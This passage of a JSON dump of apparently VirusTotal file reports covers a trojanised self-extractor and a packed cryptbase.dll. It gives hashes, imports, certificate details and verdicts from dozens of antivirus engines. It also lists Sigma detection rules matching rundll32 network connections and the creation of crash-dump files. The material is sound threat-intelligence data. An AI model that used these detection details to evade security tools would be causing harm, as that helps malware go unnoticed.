              "GlobalLock",
              "GlobalUnlock",
              "IsDBCSLeadByte",
              "LoadLibraryA",
              "LoadLibraryExA",
              "LoadResource",
              "LocalAlloc",
              "LocalFileTimeToFileTime",
              "LocalFree",
              "LockResource",
              "lstrcatA",
              "lstrcmpA",
              "lstrcmpiA",
              "lstrcpyA",
              "lstrcpynA",
              "lstrlenA",
              "MulDiv",
              "QueryPerformanceCounter",
              "ReadFile",
              "RemoveDirectoryA",
              "ResetEvent",
              "SetCurrentDirectoryA",
              "SetEvent",
              "SetFileAttributesA",
              "SetFilePointer",
              "SetFileTime",
              "SetUnhandledExceptionFilter",
              "SizeofResource",
              "TerminateProcess",
              "TerminateThread",
              "UnhandledExceptionFilter",
              "WaitForSingleObject",
              "WriteFile",
              "WritePrivateProfileStringA"
            ]
          },
          {
            "library_name": "ADVAPI32.dll",
            "imported_functions": [
              "AdjustTokenPrivileges",
              "AllocateAndInitializeSid",
              "EqualSid",
              "FreeSid",
              "GetTokenInformation",
              "LookupPrivilegeValueA",
              "OpenProcessToken",
              "RegCloseKey",
              "RegCreateKeyExA",
              "RegDeleteValueA",
              "RegOpenKeyExA",
              "RegQueryInfoKeyA",
              "RegQueryValueExA",
              "RegSetValueExA"
            ]
          },
          {
            "library_name": "USER32.dll",
            "imported_functions": [
              "CallWindowProcA",
              "CharNextA",
              "CharPrevA",
              "CharUpperA",
              "DialogBoxIndirectParamA",
              "DispatchMessageA",
              "EnableWindow",
              "EndDialog",
              "ExitWindowsEx",
              "GetDC",
              "GetDesktopWindow",
              "GetDlgItem",
              "GetDlgItemTextA",
              "GetSystemMetrics",
              "GetWindowLongA",
              "GetWindowRect",
              "LoadStringA",
              "MessageBeep",
              "MessageBoxA",
              "MsgWaitForMultipleObjects",
              "PeekMessageA",
              "ReleaseDC",
              "SendDlgItemMessageA",
              "SendMessageA",
              "SetDlgItemTextA",
              "SetForegroundWindow",
              "SetWindowLongA",
              "SetWindowPos",
              "SetWindowTextA",
              "ShowWindow",
              "wsprintfA"
            ]
          },
          {
            "library_name": "COMCTL32.dll",
            "imported_functions": [
              "Ord(17)"
            ]
          }
        ]
      },
      "authentihash": "d67fecc2be6951d9a39f775857d6bf528bbf6e9640ef4bfbd5bdb7176f7261d0",
      "reputation": 0,
      "type_description": "Win32 EXE",
      "last_analysis_stats": {
        "malicious": 52,
        "suspicious": 0,
        "undetected": 19,
        "harmless": 0,
        "timeout": 0,
        "confirmed-timeout": 0,
        "failure": 0,
        "type-unsupported": 4
      },
      "meaningful_name": "WEXTRACT.EXE",
      "signature_info": {
        "product": "Microsoft(R) Windows(R) Operating System",
        "verified": "A certificate was explicitly revoked by its issuer.",
        "file version": "6.00.2900.5512 (xpsp.080413-2105)",
        "original name": "WEXTRACT.EXE            ",
        "x509": [
          {
            "name": "Thawte Premium Server CA",
            "algorithm": "sha1RSA",
            "valid from": "1996-08-01 00:00:00",
            "valid to": "2021-01-01 23:59:59",
            "serial number": "36 12 22 96 C5 E3 38 A5 20 A1 D2 5F 4C D7 09 54",
            "cert issuer": "Thawte Premium Server CA",
            "thumbprint": "E0AB059420725493056062023670F7CD2EFC6666",
            "valid_usage": null
          },
          {
            "name": "QTI International Inc",
            "algorithm": "sha1RSA",
            "valid from": "2012-10-18 00:00:00",
            "valid to": "2014-11-13 23:59:59",
            "serial number": "2E DF B9 FD CF A0 0C CB 5A B0 09 EE 3A DB 97 B9",
            "cert issuer": "Thawte Code Signing CA - G2",
            "thumbprint": "ED7049738619CDB5C2C10B3849F0FA2D0E5BCA42",
            "valid_usage": "Code Signing, 0.4.1.311.2.1"
          },
          {
            "name": "thawte Primary Root CA",
            "algorithm": "sha1RSA",
            "valid from": "2006-11-17 00:00:00",
            "valid to": "2020-12-30 23:59:59",
            "serial number": "33 65 50 08 79 AD 73 E2 30 B9 E0 1D 0D 7F AC 91",
            "cert issuer": "Thawte Premium Server CA",
            "thumbprint": "1FA490D1D4957942CD23545F6E823D0000796EA2",
            "valid_usage": null
          },
          {
            "name": "Thawte Code Signing CA - G2",
            "algorithm": "sha1RSA",
            "valid from": "2010-02-08 00:00:00",
            "valid to": "2020-02-07 23:59:59",
            "serial number": "47 97 4D 78 73 A5 BC AB 0D 2F B3 70 19 2F CE 5E",
            "cert issuer": "thawte Primary Root CA",
            "thumbprint": "808D62642B7D1C4A9A83FD667F7A2A9D243FB1C7",
            "valid_usage": "Client Auth, Code Signing"
          }
        ],
        "signers": "QTI International Inc; Thawte Code Signing CA - G2; thawte",
        "internal name": "Wextract                ",
        "copyright": "(C) Microsoft Corporation. All rights reserved.",
        "signers details": [
          {
            "status": "This certificate or one of the certificates in the certificate chain is not time valid., The revocation status of the certificate or one of the certificates in the certificate chain is unknown., Error 65536 (0x10000), The revocation status of the certificate or one of the certificates in the certificate chain is either offline or stale.",
            "valid usage": "Code Signing, 1.3.6.1.4.1.311.2.1.22",
            "name": "QTI International Inc",
            "algorithm": "sha1RSA",
            "valid from": "12:00 AM 10/18/2012",
            "valid to": "11:59 PM 11/13/2014",
            "serial number": "2E DF B9 FD CF A0 0C CB 5A B0 09 EE 3A DB 97 B9",
            "cert issuer": "Thawte Code Signing CA - G2",
            "thumbprint": "ED7049738619CDB5C2C10B3849F0FA2D0E5BCA42"
          },
          {
            "status": "This certificate or one of the certificates in the certificate chain is not time valid.",
            "valid usage": "Client Auth, Code Signing",
            "name": "Thawte Code Signing CA - G2",
            "algorithm": "sha1RSA",
            "valid from": "12:00 AM 02/08/2010",
            "valid to": "11:59 PM 02/07/2020",
            "serial number": "47 97 4D 78 73 A5 BC AB 0D 2F B3 70 19 2F CE 5E",
            "cert issuer": "thawte Primary Root CA",
            "thumbprint": "808D62642B7D1C4A9A83FD667F7A2A9D243FB1C7"
          },
          {
            "status": "Valid",
            "valid usage": "Client Auth, Code Signing, Email Protection, Server Auth",
            "name": "thawte",
            "algorithm": "sha1RSA",
            "valid from": "12:00 AM 11/17/2006",
            "valid to": "11:59 PM 07/16/2036",
            "serial number": "34 4E D5 57 20 D5 ED EC 49 F4 2F CE 37 DB 2B 6D",
            "cert issuer": "thawte Primary Root CA",
            "thumbprint": "91C6D6EE3E8AC86384E548C299295C756C817B81"
          }
        ],
        "description": "Win32 Cabinet Self-Extractor                                           "
      },
      "creation_date": 1208111565,
      "size": 122592,
      "unique_sources": 7,
      "last_submission_date": 1660534599,
      "md5": "e2a4b96cce9de4fb126cfd5f5c73c3ed",
      "times_submitted": 12,
      "type_extension": "exe",
      "first_submission_date": 1403252620,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "ssdeep": "3072:5Gu9BlfzWIbXWm+w0JC5o++UmFmDbUG2BAVLxnJnP2:5/0uo1UmsDU4H2",
      "type_tag": "peexe",
      "last_analysis_results": {
        "Bkav": {
          "method": "blacklist",
          "engine_name": "Bkav",
          "engine_version": "1.3.0.9899",
          "engine_update": "20220815",
          "category": "undetected",
          "result": null
        },
        "Lionic": {
          "method": "blacklist",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "engine_update": "20220815",
          "category": "undetected",
          "result": null
        },
        "Elastic": {
          "method": "blacklist",
          "engine_name": "Elastic",
          "engine_version": "4.0.41",
          "engine_update": "20220728",
          "category": "malicious",
          "result": "malicious (high confidence)"
        },
        "DrWeb": {
          "method": "blacklist",
          "engine_name": "DrWeb",
          "engine_version": "7.0.56.4040",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.Starter.3690"
        },
        "MicroWorld-eScan": {
          "method": "blacklist",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.GenericKD.1749747"
        },
        "FireEye": {
          "method": "blacklist",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan.GenericKD.1749747"
        },
        "CAT-QuickHeal": {
          "method": "blacklist",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "14.00",
          "engine_update": "20220814",
          "category": "undetected",
          "result": null
        },
        "McAfee": {
          "method": "blacklist",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Artemis!E2A4B96CCE9D"
        },
        "Cylance": {
          "method": "blacklist",
          "engine_name": "Cylance",
          "engine_version": "2.3.1.101",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Unsafe"
        },
        "Zillya": {
          "method": "blacklist",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4689",
          "engine_update": "20220812",
          "category": "undetected",
          "result": null
        },
        "Sangfor": {
          "method": "blacklist",
          "engine_name": "Sangfor",
          "engine_version": "2.14.0.0",
          "engine_update": "20220812",
          "category": "undetected",
          "result": null
        },
        "K7AntiVirus": {
          "method": "blacklist",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.30.43832",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Riskware ( 0040eff71 )"
        },
        "BitDefender": {
          "method": "blacklist",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.GenericKD.1749747"
        },
        "K7GW": {
          "method": "blacklist",
          "engine_name": "K7GW",
          "engine_version": "12.30.43818",
          "engine_update": "20220813",
          "category": "malicious",
          "result": "Riskware ( 0040eff71 )"
        },
        "Cybereason": {
          "method": "blacklist",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "engine_update": "20210330",
          "category": "malicious",
          "result": "malicious.cce9de"
        },
        "Arcabit": {
          "method": "blacklist",
          "engine_name": "Arcabit",
          "engine_version": "1.0.0.889",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.Generic.D1AB2F3"
        },
        "BitDefenderTheta": {
          "method": "blacklist",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "engine_update": "20220810",
          "category": "malicious",
          "result": "Gen:NN.ZedlaF.34592.au5@ayTDw3hi"
        },
        "VirIT": {
          "method": "blacklist",
          "engine_name": "VirIT",
          "engine_version": "9.5.260",
          "engine_update": "20220812",
          "category": "undetected",
          "result": null
        },
        "Cyren": {
          "method": "blacklist",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "engine_update": "20220815",
          "category": "undetected",
          "result": null
        },
        "Symantec": {
          "method": "blacklist",
          "engine_name": "Symantec",
          "engine_version": "1.18.0.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Backdoor.Readomesa"
        },
        "tehtris": {
          "method": "blacklist",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4",
          "engine_update": "20220815",
          "category": "undetected",
          "result": null
        },
        "ESET-NOD32": {
          "method": "blacklist",
          "engine_name": "ESET-NOD32",
          "engine_version": "25759",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "a variant of Win32/TrojanProxy.Preshin.D"
        },
        "Cynet": {
          "method": "blacklist",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Malicious (score: 99)"
        },
        "APEX": {
          "method": "blacklist",
          "engine_name": "APEX",
          "engine_version": "6.323",
          "engine_update": "20220813",
          "category": "malicious",
          "result": "Malicious"
        },
        "Paloalto": {
          "method": "blacklist",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "generic.ml"
        },
        "ClamAV": {
          "method": "blacklist",
          "engine_name": "ClamAV",
          "engine_version": "0.105.1.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Win.Trojan.Agent-1213378"
        },
        "Kaspersky": {
          "method": "blacklist",
          "engine_name": "Kaspersky",
          "engine_version": "21.0.1.45",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Backdoor.Win32.Miancha.f"
        },
        "Alibaba": {
          "method": "blacklist",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "engine_update": "20190527",
          "category": "malicious",
          "result": "Backdoor:Win32/Miancha.4eaccd8d"
        },
        "NANO-Antivirus": {
          "method": "blacklist",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25618",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan.Win32.Miancha.dfftbq"
        },
        "ViRobot": {
          "method": "blacklist",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.Win32.S.Agent.122592"
        },
        "Rising": {
          "method": "blacklist",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan.Win32.Generic.16F074ED (C64:YzY0OooBb802d7PE)"
        },
        "Ad-Aware": {
          "method": "blacklist",
          "engine_name": "Ad-Aware",
          "engine_version": "3.0.21.193",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan.GenericKD.1749747"
        },
        "Zoner": {
          "method": "blacklist",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "engine_update": "20220814",
          "category": "undetected",
          "result": null
        },
        "Sophos": {
          "method": "blacklist",
          "engine_name": "Sophos",
          "engine_version": "1.4.1.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Mal/Generic-S"
        },
        "Comodo": {
          "method": "blacklist",
          "engine_name": "Comodo",
          "engine_version": "34898",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Malware@#miujbgl25uc5"
        },
        "F-Secure": {
          "method": "blacklist",
          "engine_name": "F-Secure",
          "engine_version": "18.10.978.51",
          "engine_update": "20220814",
          "category": "undetected",
          "result": null
        },
        "Baidu": {
          "method": "blacklist",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "engine_update": "20190318",
          "category": "undetected",
          "result": null
        },
        "VIPRE": {
          "method": "blacklist",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.GenericKD.1749747"
        },
        "TrendMicro": {
          "method": "blacklist",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "BKDR_MIANCHA.A"
        },
        "McAfee-GW-Edition": {
          "method": "blacklist",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2019.1.2+3728",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "BackDoor-FCGM!CFA3E3471430"
        },
        "Trapmine": {
          "method": "blacklist",
          "engine_name": "Trapmine",
          "engine_version": "3.5.48.101",
          "engine_update": "20220707",
          "category": "undetected",
          "result": null
        },
        "Emsisoft": {
          "method": "blacklist",
          "engine_name": "Emsisoft",
          "engine_version": "2021.5.0.7597",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan.GenericKD.1749747 (B)"
        },
        "Ikarus": {
          "method": "blacklist",
          "engine_name": "Ikarus",
          "engine_version": "6.0.26.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan-Proxy.Agent"
        },
        "Jiangmin": {
          "method": "blacklist",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Backdoor/Miancha.c"
        },
        "Webroot": {
          "method": "blacklist",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "engine_update": "20220815",
          "category": "undetected",
          "result": null
        },
        "Avira": {
          "method": "blacklist",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "TR/Cudofows.A.1"
        },
        "MAX": {
          "method": "blacklist",
          "engine_name": "MAX",
          "engine_version": "2019.9.16.1",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "malware (ai score=100)"
        },
        "Antiy-AVL": {
          "method": "blacklist",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan/Generic.ASMalwS.3CBD"
        },
        "Kingsoft": {
          "method": "blacklist",
          "engine_name": "Kingsoft",
          "engine_version": "2017.9.26.565",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Win32.Hack.Miancha.f.(kcloud)"
        },
        "Gridinsoft": {
          "method": "blacklist",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.89.174",
          "engine_update": "20220815",
          "category": "undetected",
          "result": null
        },
        "Microsoft": {
          "method": "blacklist",
          "engine_name": "Microsoft",
          "engine_version": "1.1.19500.2",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan:Win32/Cudofows.A"
        },
        "SUPERAntiSpyware": {
          "method": "blacklist",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "engine_update": "20220813",
          "category": "undetected",
          "result": null
        },
        "ZoneAlarm": {
          "method": "blacklist",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "engine_update": "20220815",
          "category": "undetected",
          "result": null
        },
        "GData": {
          "method": "blacklist",
          "engine_name": "GData",
          "engine_version": "A:25.33753B:27.28449",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan.GenericKD.1749747"
        },
        "Google": {
          "method": "blacklist",
          "engine_name": "Google",
          "engine_version": "1660532454",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Detected"
        },
        "AhnLab-V3": {
          "method": "blacklist",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.22.1.10283",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Dropper/Npdoor.Gen"
        },
        "Acronis": {
          "method": "blacklist",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.108",
          "engine_update": "20220426",
          "category": "undetected",
          "result": null
        },
        "VBA32": {
          "method": "blacklist",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "engine_update": "20220812",
          "category": "malicious",
          "result": "Backdoor.Miancha"
        },
        "ALYac": {
          "method": "blacklist",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan.DDoS.Agent.pidgin"
        },
        "TACHYON": {
          "method": "blacklist",
          "engine_name": "TACHYON",
          "engine_version": "2022-08-15.01",
          "engine_update": "20220815",
          "category": "undetected",
          "result": null
        },
        "Malwarebytes": {
          "method": "blacklist",
          "engine_name": "Malwarebytes",
          "engine_version": "4.3.3.37",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Malware.AI.1402476327"
        },
        "Panda": {
          "method": "blacklist",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Generic Suspicious"
        },
        "TrendMicro-HouseCall": {
          "method": "blacklist",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "BKDR_MIANCHA.A"
        },
        "Tencent": {
          "method": "blacklist",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Win32.Backdoor.Miancha.Ajuy"
        },
        "Yandex": {
          "method": "blacklist",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "engine_update": "20220725",
          "category": "undetected",
          "result": null
        },
        "SentinelOne": {
          "method": "blacklist",
          "engine_name": "SentinelOne",
          "engine_version": "22.2.1.2",
          "engine_update": "20220330",
          "category": "malicious",
          "result": "Static AI - Suspicious SFX"
        },
        "MaxSecure": {
          "method": "blacklist",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "engine_update": "20220812",
          "category": "malicious",
          "result": "Trojan.Malware.300983.susgen"
        },
        "Fortinet": {
          "method": "blacklist",
          "engine_name": "Fortinet",
          "engine_version": "6.4.258.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "W32/Miancha.F!tr.bdr"
        },
        "AVG": {
          "method": "blacklist",
          "engine_name": "AVG",
          "engine_version": "21.1.5827.0",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Win32:Malware-gen"
        },
        "Avast": {
          "method": "blacklist",
          "engine_name": "Avast",
          "engine_version": "21.1.5827.0",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Win32:Malware-gen"
        },
        "CrowdStrike": {
          "method": "blacklist",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "engine_update": "20220418",
          "category": "malicious",
          "result": "win/malicious_confidence_100% (W)"
        },
        "Trustlook": {
          "method": "blacklist",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "engine_update": "20220815",
          "category": "type-unsupported",
          "result": null
        },
        "SymantecMobileInsight": {
          "method": "blacklist",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "engine_update": "20220208",
          "category": "type-unsupported",
          "result": null
        },
        "BitDefenderFalx": {
          "method": "blacklist",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "engine_update": "20220103",
          "category": "type-unsupported",
          "result": null
        },
        "Avast-Mobile": {
          "method": "blacklist",
          "engine_name": "Avast-Mobile",
          "engine_version": "220814-00",
          "engine_update": "20220814",
          "category": "type-unsupported",
          "result": null
        }
      },
      "vhash": "0150366d1570e013z10054mz1f03dz",
      "trid": [
        {
          "file_type": "Win32 Executable MS Visual C++ (generic)",
          "probability": 48.8
        },
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 16.4
        },
        {
          "file_type": "Win32 Dynamic Link Library (generic)",
          "probability": 10.2
        },
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 7.8
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 7
        }
      ],
      "magic": "PE32 executable for MS Windows (GUI) Intel 80386 32-bit",
      "last_modification_date": 1705539704,
      "sha1": "03d047380078676b17617ce04a6585ab71640790",
      "tags": [
        "peexe",
        "overlay",
        "revoked-cert",
        "runtime-modules",
        "signed",
        "long-sleeps",
        "direct-cpu-clock-access",
        "invalid-signature"
      ],
      "last_analysis_date": 1660534599,
      "packers": {
        "PEiD": "Microsoft CAB SFX",
        "F-PROT": "CAB"
      },
      "sha256": "136e709cc83cbda0cd8ca6e46fe9e57202bd2699ca063f9d1a51602394c06ef3"
    }
  }
},
{
  "_id": {
    "$oid": "65bd33f1d6128887ccdfb85d"
  },
  "data": {
    "id": "4962a2f6cba601af509e3df0215b2eb581754cdf3410786a632b737873a399e2",
    "type": "file",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/4962a2f6cba601af509e3df0215b2eb581754cdf3410786a632b737873a399e2"
    },
    "attributes": {
      "meaningful_name": "cryptbase.dll",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "pedll"
      ],
      "names": [
        "cryptbase.dll"
      ],
      "vhash": "13607f7d0d1f1f7f5551z17z1?zb",
      "creation_date": 1699528406,
      "sigma_analysis_stats": {
        "high": 0,
        "medium": 1,
        "critical": 0,
        "low": 1
      },
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "tags": [
        "64bits",
        "detect-debug-environment",
        "pedll",
        "checks-disk-space"
      ],
      "sigma_analysis_results": [
        {
          "match_context": [
            {
              "values": {
                "EventID": "3",
                "SourceIsIpv6": "false",
                "DestinationIp": "104.208.16.93",
                "Initiated": "true",
                "Image": "C:\\Windows\\system32\\RunDll32.exe",
                "DestinationPort": "443",
                "SourcePort": "49250",
                "Protocol": "tcp",
                "DestinationIsIpv6": "false",
                "SourceIp": "172.16.1.2"
              }
            },
            {
              "values": {
                "EventID": "3",
                "Protocol": "tcp",
                "Initiated": "true",
                "DestinationIp": "104.208.16.93",
                "Image": "C:\\Windows\\system32\\RunDll32.exe",
                "DestinationPort": "443",
                "SourcePort": "49251",
                "SourceIsIpv6": "false",
                "DestinationIsIpv6": "false",
                "SourceIp": "172.16.1.2"
              }
            },
            {
              "values": {
                "EventID": "3",
                "Protocol": "tcp",
                "DestinationIp": "104.208.16.93",
                "Initiated": "true",
                "Image": "C:\\Windows\\system32\\RunDll32.exe",
                "DestinationPort": "443",
                "SourcePort": "49253",
                "SourceIsIpv6": "false",
                "DestinationIsIpv6": "false",
                "SourceIp": "172.16.1.2"
              }
            },
            {
              "values": {
                "EventID": "3",
                "Protocol": "tcp",
                "Initiated": "true",
                "DestinationIp": "104.208.16.93",
                "Image": "C:\\Windows\\system32\\RunDll32.exe",
                "DestinationPort": "443",
                "SourcePort": "49254",
                "SourceIsIpv6": "false",
                "DestinationIsIpv6": "false",
                "SourceIp": "172.16.1.2"
              }
            },
            {
              "values": {
                "EventID": "3",
                "SourceIsIpv6": "false",
                "DestinationIp": "104.208.16.93",
                "Initiated": "true",
                "Image": "C:\\Windows\\system32\\RunDll32.exe",
                "DestinationPort": "443",
                "SourcePort": "49255",
                "Protocol": "tcp",
                "DestinationIsIpv6": "false",
                "SourceIp": "172.16.1.2"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "4725cdcf2dfdd90c3aa0d331fae77d6ac8021c254701744a01444af04e9a0e69",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Rundll32 Internet Connection",
          "rule_description": "Detects a rundll32 that communicates with public IP addresses",
          "rule_author": "Florian Roth (Nextron Systems)"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "11",
                "ProcessId": "7756",
                "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER46C8.tmp.dmp",
                "RuleName": "-",
                "CreationUtcTime": "1700335146",
                "UtcTime": "1700335146",
                "ProcessGuid": "{C784477D-0E2A-6559-2406-000000004A00}",
                "Image": "C:\\Windows\\system32\\WerFault.exe"
              }
            },
            {
              "values": {
                "EventID": "11",
                "ProcessId": "7876",
                "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER4C08.tmp.dmp",
                "RuleName": "-",
                "CreationUtcTime": "1700335147",
                "UtcTime": "1700335147",
                "ProcessGuid": "{C784477D-0E2B-6559-2906-000000004A00}",
                "Image": "C:\\Windows\\system32\\WerFault.exe"
              }
            },
            {
              "values": {
                "EventID": "11",
                "ProcessId": "7960",
                "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER5E57.tmp.dmp",
                "RuleName": "-",
                "CreationUtcTime": "1700335152",
                "UtcTime": "1700335152",
                "ProcessGuid": "{C784477D-0E30-6559-2C06-000000004A00}",
                "Image": "C:\\Windows\\system32\\WerFault.exe"
              }
            },
            {
              "values": {
                "EventID": "11",
                "ProcessId": "8092",
                "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER6CCF.tmp.dmp",
                "RuleName": "-",
                "CreationUtcTime": "1700335156",
                "UtcTime": "1700335156",
                "ProcessGuid": "{C784477D-0E33-6559-2F06-000000004A00}",
                "Image": "C:\\Windows\\system32\\WerFault.exe"
              }
            },
            {
              "values": {
                "EventID": "11",
                "ProcessId": "7268",
                "Image": "C:\\Windows\\system32\\WerFault.exe",
                "RuleName": "-",
                "CreationUtcTime": "1700335161",
                "UtcTime": "1700335161",
                "ProcessGuid": "{C784477D-0E39-6559-3206-000000004A00}",
                "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER82A8.tmp.dmp"
              }
            }
          ],
          "rule_level": "low",
          "rule_id": "67ee86b34b3617ea45dec0ef09b7a71a5f44f5c010ccc9139d92f49685996f49",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "DMP/HDMP File Creation",
          "rule_description": "Detects the creation of a file with the \".dmp\"/\".hdmp\" extension. Often created by software during a crash. Memory dumps can sometimes contain sensitive information such as credentials. It's best to determine the source of the crash.",
          "rule_author": "Nasreddine Bencherchali (Nextron Systems)"
        }
      ],
      "type_extension": "dll",
      "size": 3320320,
      "last_modification_date": 1706324629,
      "detectiteasy": {
        "filetype": "PE64",
        "values": [
          {
            "version": "1.XX-2.XX",
            "type": "Protector",
            "name": "Themida/Winlicense"
          },
          {
            "info": "LTCG/C++",
            "version": "19.28.29914",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "version": "14.28.29914",
            "type": "Linker",
            "name": "Microsoft Linker"
          },
          {
            "version": "2019 version 16.9-16.10",
            "type": "Tool",
            "name": "Visual Studio"
          }
        ]
      },
      "tlsh": "T157E53360F9028B53CB3176B7D533869BFFA26ABD8A435B0B770A565864D1BDBCD4002C",
      "first_submission_date": 1700335076,
      "times_submitted": 33,
      "last_analysis_results": {
        "Bkav": {
          "method": "blacklist",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "Lionic": {
          "method": "blacklist",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Trojan.Win32.Generic.4!c"
        },
        "tehtris": {
          "method": "blacklist",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "engine_update": "20240127",
          "category": "malicious",
          "result": "Generic.Malware"
        },
        "MicroWorld-eScan": {
          "method": "blacklist",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Gen:Variant.Lazy.435379"
        },
        "ClamAV": {
          "method": "blacklist",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "FireEye": {
          "method": "blacklist",
          "engine_name": "FireEye",
          "engine_version": "35.47.0.0",
          "engine_update": "20240127",
          "category": "malicious",
          "result": "Generic.mg.5be374a55e9452b9"
        },
        "CAT-QuickHeal": {
          "method": "blacklist",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Trojan.Agent"
        },
        "Skyhigh": {
          "method": "blacklist",
